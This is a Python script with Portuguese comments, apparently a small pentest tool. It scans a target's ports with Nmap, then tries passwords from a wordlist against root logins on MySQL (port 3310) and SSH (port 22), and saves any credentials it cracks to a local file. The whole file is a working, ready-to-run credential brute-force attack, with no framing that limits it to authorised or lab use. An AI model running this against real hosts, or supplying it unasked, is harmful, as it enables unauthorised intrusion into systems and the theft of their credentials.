import nmap
import paramiko
import mysql.connector
from mysql.connector import Error
import argparse
import sys
import os

DEFAULT_PORT_RANGE = "1-10000"

# Funções de Força Bruta:

def log_to_file(message):
    """Salva mensagens no arquivo 'successfull.txt'."""
    with open('successfull.txt', 'a') as file:
        file.write(message + '\n')

def ssh_brute_force(ip, port, username, passwords):
    """Tenta quebrar a senha de SSH usando um dicionário de senhas"""
    print(f"Tentando força bruta no SSH (porta {port})...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in passwords:
        try:
            print(f"Tentando senha SSH: {username}:{password}")
            client.connect(ip, port=port, username=username, password=password)
            print(f"✅ Sucesso no SSH: {username}:{password}")
            
            # Log no arquivo
            log_to_file(f"SSH - {username}:{password} - {ip}")
            
            client.close()
            return True
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"Erro no SSH: {e}")
            break
    return False


def mysql_brute_force(ip, port, username, passwords):
    """Tenta quebrar a senha de MySQL (porta 3310) usando um dicionário de senhas"""
    print(f"Tentando força bruta no MySQL (porta {port})...")
    for password in passwords:
        print(f"Tentando senha MySQL: {username}:{password}")
        try:
            connection = mysql.connector.connect(
                host=ip,
                port=port,  # Alterado para porta 3310 ou 3306
                user=username,
                password=password,
                connection_timeout=10  # Aumentando o tempo de espera para 10 segundos
            )
            if connection.is_connected():
                print(f"✅ Sucesso no MySQL: {username}:{password}")
                
                # Log no arquivo
                log_to_file(f"MySQL - {username}:{password} - {ip}")
                
                connection.close()
                return True
        except mysql.connector.Error as err:
            print(f"Erro ao tentar conectar no MySQL (Senha: {password}): {err}")
            pass
        except Exception as e:
            print(f"Erro inesperado no MySQL: {e}")
            pass
    return False


def scan_ports_nmap(target, port_range):
    """Escaneia portas abertas em um determinado host usando Nmap"""
    print(f"🔎 Escaneando {target} nas portas {port_range} com Nmap...")

    nm = nmap.PortScanner()

    try:
        nm.scan(target, arguments=f"-p {port_range}")
        
        if target not in nm.all_hosts():
            print(f"❌ Host {target} não encontrado ou inacessível.")
            return []

        open_ports = []
        for proto in nm[target].all_protocols():
            ports = nm[target][proto].keys()
            for port in ports:
                if nm[target][proto][port]["state"] == "open":
                    open_ports.append(port)
                    print(f"[✅] Porta {port} aberta")

        if not open_ports:
            print("❌ Nenhuma porta aberta encontrada.")
        return open_ports
    except nmap.PortScannerError as e:
        print(f"❌ Erro ao escanear com Nmap: {e}")
        return []


def parse_arguments():
    """Analisa os argumentos da linha de comando"""
    parser = argparse.ArgumentParser(description="Scanner de portas e ataques de força bruta")
    parser.add_argument("-t", "--target", required=True, help="IP ou domínio de destino")
    parser.add_argument("-p", "--ports", default=DEFAULT_PORT_RANGE, help="Intervalo de portas (ex: 1-10000)")
    parser.add_argument("--passwords", required=True, help="Arquivo de senhas para ataque de força bruta")
    return parser.parse_args()

def get_password_file_path(file_path):
    """Retorna o caminho correto do arquivo de senhas"""
    if not os.path.isabs(file_path):
        # Se o caminho não for absoluto, pega o caminho absoluto em relação ao diretório atual
        return os.path.join(os.getcwd(), file_path)
    return file_path

def main():
    """Função principal do script"""
    # Cria ou limpa o arquivo 'successfull.txt'
    open('successfull.txt', 'w').close()

    args = parse_arguments()
    password_file = get_password_file_path(args.passwords)
    
    # Verifica se o arquivo de senhas existe
    if not os.path.exists(password_file):
        print(f"❌ Arquivo de senhas '{password_file}' não encontrado!")
        sys.exit(1)

    with open(password_file, "r") as f:
        passwords = f.readlines()
    passwords = [p.strip() for p in passwords]

    target = args.target
    try:
        port_range = args.ports
    except ValueError as e:
        print(f"❌ {e}")
        sys.exit(1)

    # Escaneia portas abertas com Nmap
    open_ports = scan_ports_nmap(target, port_range)

    # Realiza ataques de força bruta
    print("\n🚨 Iniciando ataques de força bruta...")

    # Ataque de força bruta em MySQL (porta 3310)
    if 3310 in open_ports:
        print("\n🚨 Porta 3310 aberta - Iniciando ataque de força bruta em MySQL...")
        success = mysql_brute_force(target, 3310, "root", passwords)
        if not success:
            print("❌ Ataque de força bruta falhou em MySQL.")
        else:
            print("✅ Ataque de força bruta bem-sucedido em MySQL!")

    # Ataque de força bruta em SSH (porta 22)
    if 22 in open_ports:
        print("\n🚨 Porta 22 aberta - Iniciando ataque de força bruta em SSH...")
        success = ssh_brute_force(target, 22, "root", passwords)
        if not success:
            print("❌ Ataque de força bruta falhou em SSH.")
        else:
            print("✅ Ataque de força bruta bem-sucedido em SSH!")

if __name__ == "__main__":
    main()
